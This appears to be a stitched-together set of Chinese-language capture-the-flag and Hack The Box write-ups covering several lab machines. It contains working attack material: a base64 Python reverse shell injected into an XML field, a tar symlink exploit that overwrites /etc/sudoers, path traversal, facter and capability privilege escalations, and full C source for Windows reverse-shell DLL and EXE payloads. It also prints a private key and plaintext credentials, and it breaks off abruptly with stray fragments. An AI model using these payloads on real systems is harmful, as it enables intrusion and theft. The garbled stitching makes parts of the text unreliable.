-p 2222 markus@'s password: #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. markus@twisted:~$ ls note.txt markus@twisted:~$ cat note.txt Hi bonita, I have saved your id_rsa here: /var/cache/apt/id_rsa Nobody can find it. markus@twisted:~$ id uid=1001(markus) gid=1001(markus) groups=1001(markus) ``` 拿到一个提示并告诉我们bonita用户的密钥在``，然后没思路了，看了下wp，发现使用的是getcap这个命令，`getcap`命令用于查看文件的capabilities，capabilities是一种权限分离机制，可以将root用户的全部权限分解为多个独立的capabilities，然后赋予给特定的进程或文件。这种机制可以提高系统的安全性，防止恶意进程获得过多的权限。 ```bash markus@twisted:/tmp$ /usr/sbin/getcap / -r 2>/dev/null /usr/bin/ping = cap_net_raw+ep /usr/bin/tail = cap_dac_read_search+ep ``` 看不懂直接丢给ai ``` 1. /usr/bin/ping = cap_net_raw+ep - ``文件被赋予了`cap_net_raw`和`cap_net_admin`能力。 - cap_net_raw：允许程序发送和接收原始网络数据包（如ICMP数据包，用于`ping`命令）。 - cap_net_admin：允许程序执行网络管理任务（如配置网络接口）。 - +ep：表示这些能力在“有效集”（Effective）和“许可能力集”（Permitted）中被启用。 2. /usr/bin/tail = cap_dac_read_search+ep - ``文件被赋予了`cap_dac_read_search`能力。 - cap_dac_read_search：允许程序绕过文件系统的访问控制，直接读取文件内容。这对于`tail`命令来说很重要，因为它需要访问某些受保护的文件（如系统日志）。 - +ep：同样表示这些能力在“有效集”和“许可能力集”中被启用。 ``` 这说明tail可以读id_rsa ```bash markus@twisted:/tmp$ tail /var/cache/apt/id_rsa mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+ bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtq yzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSP UvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh V2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ LlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rz a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKF eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu D0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ== -----END OPENSSH PRIVATE KEY----- ``` 但是这个tail是从后面开始读的，使用-n参数指定读取的行数，拿到密钥之后在本地写一个然后使用密钥连上去 ```bash markus@twisted:/tmp$ tail -n 100 /var/cache/apt/id_rsa ``` ```bash vi tmp chmod 600 tmp ┌──(root㉿kali-plus)-[~] └─# ssh bonita@ -p 2222 -i tmp Linux twisted 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. bonita@twisted:~$ ls beroot user.txt bonita@twisted:~$ cat user.txt HMVblackcat ``` ## 提权 发现没有sudo，只有一个beroot文件 ```bash bonita@twisted:~$ file beroot beroot: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fecfbde059505a54f66d3229cc9ebb78f997a7ba, not stripped ``` 看样子是一个二进制文件，下载下来放ida里看看 ```c int __fastcall main(int argc, const char **argv, const char **envp) { int v4; // [rsp+1Ch] [rbp-4h] BYREF printf("Enter the code:\n "); scanf("%i", &v4); if ( v4 == 5880 ) { setuid(0); setgid(0); system("/bin/bash"); } else { puts("\nWRONG"); } return 0; } ``` 可以得到答案是5880，然后就成功提权拿到root了 ```bash bonita@twisted:~$ ./beroot Enter the code: 5880 root@twisted:~# id uid=0(root) gid=0(root) groups=0(root),1002(bonita) root@twisted:~# cd .. root@twisted:/home# cd .. root@twisted:/# cd root root@twisted:/root# ls root.txt root@twisted:/root# cat root.txt HMVwhereismycat ```

参数：
| 命令                                  | 含义        | 说明                                      |
| ----------------------------------- | --------- | --------------------------------------- |
| `set SSL true`                      | 启用HTTPS   | 目标使用443端口且是HTTPS协议，需要SSL/TLS加密连接        |
| `set TARGETURI /`                   | 设置目标URI路径 | 漏洞存在于根路径 `/`，如果应用有上下文路径（如 `/mirth`）则需修改 |
| `set ForceExploit true`             | 强制利用      | 即使目标版本检测不匹配，也强制执行攻击（可能误报或检测失败时使用）       |
| `set VERBOSE true`                  | 详细输出      | 显示更多执行细节，便于调试和观察攻击过程                    |
| `set payload cmd/unix/reverse_bash` | 设置攻击载荷    | 使用Bash反向shell，目标连接回攻击者（您的tun0接口）        |

```plain

端口6661是一个Mirth通道，用于通过TCP监听HL7消息
端口54321是一个内部Flask/WerkzeugWeb服务器

Mirth通道执行以下操作:
1.在TCP端囗6661上监听HL7消息(MLLP帧格式)
2.使用MessageBuilder步骤将HL7字段转换为XML
3.将XML POST到http://127.0.0.1:54321/addPatient
```
生成反弹shell的base64编码
```shell
┌──(root㉿zss)-[/home/…/桌面/HTB/Season10/Interpreter]
└─# echo 'import socket,os,pty;s=socket.socket();s.connect(("10.10.16.130",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' | base64

MTYuMTMwIiw5MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwx

```
接着构造恶意xml执行
```bash
python3 - << 'EOF'
import http.client
import base64

xml = """<patient>
  <timestamp>20250101120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>12345</id>
  <firstname>{exec(__import__('base64').b64decode('aW1wb3J0IHNvY2tldCxvcyxwdHk7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgiMTAuMTAuMTYuMTMwIiw5MDAxKSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7cHR5LnNwYXduKCIvYmluL2Jhc2giKQo=').decode())}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>"""

conn = http.client.HTTPConnection("127.0.0.1", 54321)
conn.request("POST", "/addPatient", body=xml, headers={"Content-Type": "application/xml"})
resp = conn.getresponse()
print(resp.status, resp.reason)
print(resp.read().decode())
EOF
```

看一下这个脚本
```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```
![](/img/file-20260224233837949.png)
使用脚本生成一个tar文件
```python
import tarfile
import os
import io
import sys
comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""
with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)
    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)
    content = b"wacky ALL=(ALL) NOPASSWD: ALL\n"
    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(content)
    tar.addfile(c, fileobj=io.BytesIO(content))
print("[+] Exploit created")
```

攻击流程：
```plain
提取目录: /opt/backup_clients/restored_backups/restore_x/

1. 创建 ddddd... (247个d) 目录
   └── 创建符号链接 a -> ddddd...
   
2. 进入 ddddd...，重复16次
   最终路径长度: 247*16 = 3952 字符

3. 在深层创建 llll... (254个l) -> ../../../../ (16次)
   
4. escape 链接指向:
   a/b/c/.../p/llll.../../../../../../../.. -> /etc
   
5. sudoers_link (硬链接) -> escape/sudoers -> /etc/sudoers

6. 写入 sudoers_link 内容 = 写入 /etc/sudoers
```

可以下载minio去连接，下面是国内下载地址，使用官方的会很慢
```bash
curl -L https://dl.minio.org.cn/client/mc/release/linux-amd64/mc \
--create-dirs \
-o $HOME/aistor-binaries/mc

chmod +x ~/aistor-binaries/mc

~/aistor-binaries/mc --help
```

得到密码`<REDACTED_PASSWORD>` 现在知道密码了但是还不知道用户名，这个版本有个文件读取漏洞，尝试读取/etc/passwd
```plain
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

# 提权
查看用户权限
```bash
trivia@facts:/home/william$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```
发现有个facter，经典的facter提权
```bash
trivia@facts:/home/william$ cd /tmp
trivia@facts:/tmp$ mkdir xyz
trivia@facts:/tmp$ echo 'exec "/bin/sh"' > /tmp/xyz/test.rb
trivia@facts:/tmp$ sudo /usr/bin/facter --custom-dir=/tmp/xyz
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
minio-binaries  ministack  root.txt  snap
# cat root.txt
<root flag>
```

title: HTB-Cap靶机渗透记录
content:
# 信息搜集
nmap扫描
```bash
┌──(root㉿zss)-[/home/zss/桌面/HTB/Cap]
└─# nmap -p- <HTB_TARGET_IP> -A -sC -sV -Pn --min-rate=10000
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-16 16:33 CST
Nmap scan report for cap.htb (<HTB_TARGET_IP>)
Host is up (8.0s latency).
Not shown: 64371 filtered tcp ports (no-response), 1161 closed tcp ports (reset)
PORT   STATE SERVICE    VERSION
21/tcp open  tcpwrapped
22/tcp open  tcpwrapped
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  tcpwrapped
|_http-server-header: gunicorn
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
No OS matches for host

TRACEROUTE (using port 5900/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 263.39 seconds
```
看看80端口，发现通过修改`http://<HTB_TARGET_IP>/data/1` 中，data后面的数字即可下载其他的流量包，下载下来分析流量包，通过分析0.pcap这个流量包可以发现ftp用户名和密码
![](/img/file-20251216165758634.png)
# 获取 User Flag
`nathan/Buck3tH4TF0RM3!` ftp登录
```bash
┌──(root㉿zss)-[/home/zss/桌面/HTB/Cap]
└─# ftp <HTB_TARGET_IP>
Connected to <HTB_TARGET_IP>.
220 (vsFTPd 3.0.3)
Name (<HTB_TARGET_IP>:zss): nathan
331 Please specify the password.
Password: 
<REDACTED_PASSWORD> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||41050|)
150 Here comes the directory listing.
-rwxrwxr-x    1 1001     1001         9627 Dec 16 06:36 CVE-2021-3560.sh
-rwxrwxr-x    1 1001     1001       971926 Dec 16 06:33 linpeas.sh
drwxr-xr-x    3 1001     1001         4096 Dec 16 06:33 snap
-r--------    1 1001     1001           33 Dec 16 06:03 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||44900|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |*******************************************************|    33        0.09 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:06 (0.00 KiB/s)

┌──(root㉿zss)-[/home/zss/桌面/HTB/Cap]
└─# cat user.txt
<user flag>
```
# 提权
上传linpeas.sh扫一下
```bash
Files with capabilities (limited to 50):
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
发现capabilities，直接在GTFObins上搜一下
```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# ls
CVE-2021-3560.sh  linpeas.sh  snap  user.txt
# cd /root
# ls
root.txt  snap
# cat root.txt
<root flag>
```

# 获取 User Flag
扫了这么多，都指向一个地址-> `/accounts/admin` 访问，使用`admin/<REDACTED_PASSWORD>`登录~~(我也不知道这密码是哪来的，不管了先打再说😅)~~  
登录进去之后可以看到有很多文章，随机点进去一个发现可以上传Banner，这里存在一个漏洞，就是可以上传恶意的dll文件，首先编写一个`sqlite_c_shell.c` 
```c
#include <winsock2.h>       // 引入Windows网络编程库，用于创建网络连接
#include <windows.h>        // 引入Windows系统API库，用于进程创建、句柄操作等
#include <ws2tcpip.h>       // 补充网络编程相关定义
#pragma comment(lib, "Ws2_32.lib")  // 告诉编译器链接Ws2_32.lib库（网络功能依赖库）

// SQLite扩展初始化函数：SQLite加载扩展时会自动调用此函数（DLL入口点）
__declspec(dllexport) int sqlite3_extension_init(void *db, char **pzErrMsg, void *pApi) {
    WSADATA wsaData;         // 存储Winsock初始化信息
    SOCKET s;                // 网络套接字（用于建立TCP连接）
    struct sockaddr_in sa;   // 存储攻击机的IP和端口信息
    STARTUPINFO si;          // 存储新进程（cmd.exe）的启动配置
    PROCESS_INFORMATION pi;  // 存储新进程的ID、句柄等信息

    // 初始化Winsock 2.2版本（Windows网络功能必须先初始化）
    WSAStartup(MAKEWORD(2,2), &wsaData);

    // 创建TCP套接字：AF_INET（IPv4）、SOCK_STREAM（TCP协议）、IPPROTO_TCP（TCP传输协议）
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // 配置攻击机地址信息
    sa.sin_family = AF_INET;                     // 使用IPv4地址族
    sa.sin_addr.s_addr = inet_addr("<ATTACKER_IP>");// 攻击机的IP地址（需替换为实际攻击机IP）
    sa.sin_port = htons(81);                     // 攻击机监听端口（81端口，htons用于转换端口字节序）

    // 尝试与攻击机建立TCP连接，连接成功则执行命令行反弹
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
        memset(&si, 0, sizeof(si));              // 将STARTUPINFO结构体清零（初始化）
        si.dwFlags = STARTF_USESTDHANDLES;       // 让新进程使用指定的标准输入/输出/错误句柄
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;  // 将cmd的输入/输出/错误绑定到套接字
        si.cb = sizeof(si);                      // 设置STARTUPINFO结构体的大小（必须配置）

        // 创建新进程：启动cmd.exe，继承套接字句柄（实现命令行反弹）
        CreateProcess(
            NULL,               // 可执行文件路径（NULL表示使用系统默认路径找cmd.exe）
            "cmd.exe",          // 命令行参数（启动命令提示符）
            NULL,               // 进程安全属性（默认）
            NULL,               // 线程安全属性（默认）
            TRUE,               // 允许子进程继承父进程的句柄（关键：让cmd继承套接字）
            0,                  // 进程创建标志（默认）
            NULL,               // 新环境变量（默认）
            NULL,               // 新工作目录（默认）
            &si,                // 进程启动配置（绑定套接字）
            &pi                 // 输出进程信息（进程ID、句柄等）
        );

        // 等待cmd.exe进程结束（防止进程提前退出）
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);  // 关闭进程句柄（释放资源）
        CloseHandle(pi.hThread);   // 关闭线程句柄（释放资源）
    }

    WSACleanup();  // 清理Winsock资源（关闭网络连接相关资源）
    closesocket(s); // 关闭套接字（断开TCP连接）
    return 0;      // 返回0表示SQLite扩展初始化成功（无实际意义，仅满足函数定义）
}
```
使用命令`x86_64-w64-mingw32-gcc sqlite_c_shell.c -o sqlite_shell.dll -shared -lws2_32` 进行编译生成`sqlite_shell.dll` 并生成共享库，链接ws2_32.lib库（Windows 网络功能依赖库，代码中`#pragma comment`也指定了此库，双重确保链接）

然后需要编写C脚本生成一个shell.exe
```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main() {  // 普通EXE的入口函数（main函数），而非DLL的扩展初始化函数
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in sa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2,2), &wsaData);  // 初始化Winsock
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);  // 创建TCP套接字

    // 配置攻击机地址（端口改为443，避免被防火墙拦截，443是HTTPS默认端口，通常允许出站）
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("<ATTACKER_IP>");  // 替换为攻击机IP
    sa.sin_port = htons(443);  // 攻击机监听443端口

    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) == 0) {  // 建立TCP连接
        memset(&si, 0, sizeof(si));
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;  // 绑定cmd输入/输出到套接字
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;  // 使用指定的标准句柄

        // 创建cmd.exe进程（实现反向shell）
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

        WaitForSingleObject(pi.hProcess, INFINITE);  // 等待进程结束
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    WSACleanup();
    closesocket(s);
    return 0;
}
```

while ($true) {  # 无限循环（直到覆盖成功）

发现这个域名解析配置文件，贴一下gemini3的解释
```bash
这是一个 Linux 系统中非常关键的网络配置文件，名为 `/etc/resolv.conf`。

简单来说，**这个文件告诉计算机（在这里是一个 Docker 容器）去哪里寻找 DNS 服务器**，以便将域名（如 `google.com` 或 `myservice`）转换成 IP 地址。

从文件内容的注释 `# Generated by Docker Engine` 可以看出，你当前是在一个 **Docker 容器** 的环境内部。

以下是逐行内容的详细解释：

### 1. 核心配置解析

**`nameserver 127.0.0.11`**

- **含义**：这是最重要的设置。它指定了 DNS 服务器的 IP 地址。
    
- **为什么是 127.0.0.11？**：
    
    - 这不是你本地电脑（Host）的地址，也不是公共 DNS（如 8.8.8.8）。
        
    - 这是 **Docker 嵌入式 DNS 服务器 (Embedded DNS Server)** 的保留地址。
        
    - **作用**：当你在容器里访问网络时，DNS 请求会先发给这个地址。Docker 会拦截这些请求，如果请求的是容器名称（Service Discovery），它会返回对应容器的 IP；如果请求的是外部域名（如 baidu.com），它会转发给你宿主机的 DNS 设置去解析。
        

**`options ndots:0`**

- **含义**：这是一个 DNS 解析的性能优化选项。
    
- **技术细节**：默认情况下，Linux 解析域名时，如果域名中的“点”数量少于 `ndots` 的设定值（默认为 1），系统会先尝试在域名后面拼接 `search domain`（搜索域）进行查询。
    
- **设置为 0 的作用**：`ndots:0` 意味着只要域名里有点（甚至没有点），就**优先把它当作一个完整的绝对域名来解析**，而不是先去尝试拼接各种后缀。这通常用于提高解析速度，减少不必要的 DNS 查询请求。
    

### 2. 注释部分解析

文件底部的注释提供了关于这个文件是如何生成的上下文信息：

- `# Based on host file: '/etc/resolv.conf' (internal resolver)`
    
    - 说明 Docker 在生成这个文件时，参考了宿主机（Host）上的 `/etc/resolv.conf` 配置。
        
- `# ExtServers: [host(<INTERNAL_IP>)]`
    
    - 这显示了实际上 Docker 最终会将外部 DNS 请求转发给哪个 IP。`<INTERNAL_IP>` 通常是 Docker Desktop（特别是 Mac 或 Windows 版）用于虚拟机通信的内部网关地址。
        
- `# Overrides: []`
    
    - 表示没有应用额外的覆盖配置。
        

---

### 总结

- **这是什么文件？** 容器的 DNS 配置文件。
    
- **它在做什么？** 它配置容器使用 Docker 内部的 DNS 解析器 (`127.0.0.11`)，以便容器既能通过服务名找到其他容器，也能通过宿主机访问互联网。
    

我可以为你做个测试吗？

如果你怀疑网络有问题，我们可以尝试在该环境下运行 nslookup google.com 或者 ping google.com 来看看 DNS 解析是否实际工作正常。需要我教你怎么做吗？
```
